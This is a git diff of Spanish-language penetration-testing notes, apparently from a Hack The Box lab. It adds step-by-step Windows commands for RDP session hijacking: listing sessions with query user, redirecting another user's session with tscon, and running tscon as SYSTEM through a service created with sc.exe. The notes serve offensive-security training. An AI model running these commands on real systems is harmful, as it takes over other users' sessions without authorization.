@@ -90,22 +90,36 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:
 
 > Para este ataque necesitamos tener privilegios de SYSTEM y poder usar `tscon.exe` .
 
+**Ver ID de las sesiones**
 
-
-```
+```cmd
 C:\htb> query user
 
  USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 >juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
  lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
+```
 
+**Redirigir la sesion objetivo a nuestra terminal**
+
+```cmd
+C:\htb> tscon 2 /dest:rdp-tcp#13
+```
+
+**Elevar permisos a SYSTEM**
+
+Creando un servicio que ejecute una terminal con el siguiente comando para escalar los privilegios a SYSTEM.
+
+```cmd
 C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
 
 [SC] CreateService SUCCESS
 ```
 
+**Ejecutar el ataque**
+
 ```cmd
-C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
+net start sessionhijack
 ```
 
 ## Misconfiguraciones
